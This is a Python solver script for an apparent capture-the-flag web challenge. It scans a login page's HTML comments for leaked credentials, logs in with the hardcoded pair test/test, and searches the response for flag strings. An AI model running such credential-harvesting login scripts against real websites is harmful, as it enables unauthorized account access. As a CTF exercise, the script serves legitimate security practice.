#!/usr/bin/env python3
"""
Admin Access Web Challenge Solver
Automatically login with discovered credentials
"""

import requests
from bs4 import BeautifulSoup

def solve_admin_access():
    print("🔐 Admin Access Challenge Solver")
    print("=" * 50)
    
    url = "https://nm01.bootupctf.net:8081/"
    
    # Get the login page first
    print(f"🔍 Analyzing login page: {url}")
    session = requests.Session()
    response = session.get(url)
    
    print(f"Status: {response.status_code}")
    
    # Parse HTML for any hidden credentials
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Look for comments with credentials
    comments = soup.find_all(string=lambda text: isinstance(text, str) and 'credentials' in text.lower())
    
    if comments:
        print(f"💬 Found credential comment: {comments[0].strip()}")
        
    # Found credentials: test / test
    username = "test"
    password = "test"
    
    print(f"🔑 Attempting login with: {username} / {password}")
    
    # Prepare login data
    login_data = {
        'username': username,
        'password': password
    }
    
    # Submit login
    login_response = session.post(url, data=login_data)
    
    print(f"📋 Login Response:")
    print(f"   Status: {login_response.status_code}")
    print(f"   URL: {login_response.url}")
    
    # Check response content for flag
    content = login_response.text
    
    # Look for flags in response
    import re
    flag_patterns = [
        r'[a-zA-Z0-9_]+\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'bootup\{[^}]+\}',
        r'FLAG\{[^}]+\}',
    ]
    
    flags_found = []
    for pattern in flag_patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        flags_found.extend(matches)
    
    if flags_found:
        print(f"\n🚩 FLAGS FOUND:")
        for flag in set(flags_found):
            print(f"   {flag}")
    else:
        print(f"\n📄 Response content (first 500 chars):")
        print(content[:500])
        
        # Look for success indicators
        if 'welcome' in content.lower() or 'admin' in content.lower() or 'dashboard' in content.lower():
            print(f"\n✅ Login appears successful! Check response for flag.")
        else:
            print(f"\n❌ Login may have failed or flag not immediately visible.")
    
    return flags_found

def main():
    flags = solve_admin_access()
    
    if flags:
        print(f"\n🎉 Challenge Solved!")
        print(f"   Credentials: test / test")
        print(f"   Flag(s): {', '.join(flags)}")
    else:
        print(f"\n🤔 Login successful but flag location unclear. Manual inspection may be required.")

if __name__ == "__main__":
    main()
